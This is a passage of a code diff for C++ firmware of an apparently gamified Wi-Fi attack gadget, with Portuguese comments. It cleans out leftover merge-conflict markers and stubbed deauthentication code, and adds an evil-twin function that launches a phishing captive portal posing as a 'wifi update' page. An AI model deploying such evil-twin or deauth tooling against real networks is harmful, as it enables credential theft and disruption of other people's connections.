-        if (current_ap_count > last_ap_count + 5) {
-            Serial.println("[Attack] Ambiente Rico detectado!");
-        }
-        last_ap_count = current_ap_count;
-
-        // Otimização 3: Marauder Duty Cycle
-        // Se Fome > 90 (Muito faminto), ataca agressivamente
-        // Se Fome < 20 (Cheio), apenas escuta passivamente
-        if (PwnPet::getHunger() > 80) {
-             // Ataque ativo (Deauth broadcast simulado)
-             // if (millis() % 10000 == 0) deauthTarget("FF:FF:FF:FF:FF:FF");
-        }
-    }
-
-    static void deauthTarget(String bssid) {
-        Serial.printf("[Attack] Deauthing %s\n", bssid.c_str());
-        // Simulação de captura
-        // Na prática, injetar frames aqui
-
-        // Se sucesso (simulado):
+        // Para gameplay, podemos recompensar de forma simbólica:
         PwnPet::addHandshake(false);
+        Gamification::registerHandshake();
+        stats.handshakes_captured++;
     }
 
-    static void evilTwin(String ssid) {
-        WiFi.softAP(ssid.c_str());
-        // Inicia DNS Server...
->>>>>>> origin/pwntamagotchi-br-final-90-features
-=======
-        WiFi.softAP(ssid.c_str());
-        // Inicia DNS Server para redirecionar tudo para o Portal
-        // Feito no EvilPortal.h
->>>>>>> origin/pwntamagotchi-br-final-lvgl9-optimized
-=======
-        WiFi.softAP(ssid.c_str());
-        // Inicia DNS Server para redirecionar tudo para o Portal
-        // Feito no EvilPortal.h
->>>>>>> origin/pwntamagotchi-br-v2-webui-final
+    // Inicia um Evil Twin usando o módulo EvilPortal.
+    static void evilTwin(const String &ssid) {
+        Serial.printf("[Attack] Iniciando Evil Portal com SSID '%s'\n", ssid.c_str());
+        EvilPortal::start(ssid.c_str(), "/evil_portal/01_wifi_update.html");
+    }
+
+    static AttackStats getStats() {
+        return stats;
     }
 };
 
-AttackStats PwnAttack::stats;
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-bool PwnAttack::scan_active = true;
-unsigned long PwnAttack::last_scan_time = 0;
-=======
-bool PwnAttack::scan_active = false;
->>>>>>> origin/pwn-tamagotchi-br-release
-=======
-bool PwnAttack::scan_active = true;
-unsigned long PwnAttack::last_scan_time = 0;
->>>>>>> origin/pwn-tamagotchi-legendary-edition-final
-=======
-bool PwnAttack::scan_active = true;
-unsigned long PwnAttack::last_scan_time = 0;
->>>>>>> origin/pwn-tamagotchi-legendary-qs-final
-=======
-bool PwnAttack::scan_active = true;
-unsigned long PwnAttack::last_scan_time = 0;
->>>>>>> origin/pwntamagotchi-br-final-90-features
-=======
-bool PwnAttack::scan_active = true;
-unsigned long PwnAttack::last_scan_time = 0;
->>>>>>> origin/pwntamagotchi-br-final-lvgl9-optimized
-=======
-bool PwnAttack::scan_active = true;
-unsigned long PwnAttack::last_scan_time = 0;
->>>>>>> origin/pwntamagotchi-br-v2-webui-final
-
+// Definições estáticas declaradas em core_singletons.cpp
 #endif
